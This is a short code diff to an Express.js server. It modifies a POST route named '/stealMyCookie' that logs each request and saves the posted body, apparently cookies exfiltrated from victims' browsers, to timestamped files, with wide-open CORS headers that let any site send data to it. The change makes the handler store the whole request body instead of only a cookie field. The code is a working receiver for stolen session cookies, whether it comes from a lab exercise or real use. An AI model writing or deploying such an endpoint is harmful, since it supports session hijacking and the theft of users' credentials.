@@ -50,10 +50,9 @@ app.post('/mailme', function (req, res) {
   });
 
 app.post("/stealMyCookie", function(req, res) {
-
   console.log(`\n------------------\nInvoked at ${new Date()}\n------------------\n`);
-  const stolen = JSON.parse(Object.keys(req.body)[0]);
-  fs.writeFileSync("misc/" + new Date(), stolen.cookie);
+  console.log(req.body.toString());
+  fs.writeFileSync(path.join(__dirname, "misc", (+ new Date()).toString()), JSON.stringify(req.body));
   res.append('Access-Control-Allow-Origin', ['*']);
   res.append('Access-Control-Allow-Methods', 'PUT');
   res.append('Access-Control-Allow-Headers', 'Content-Type');
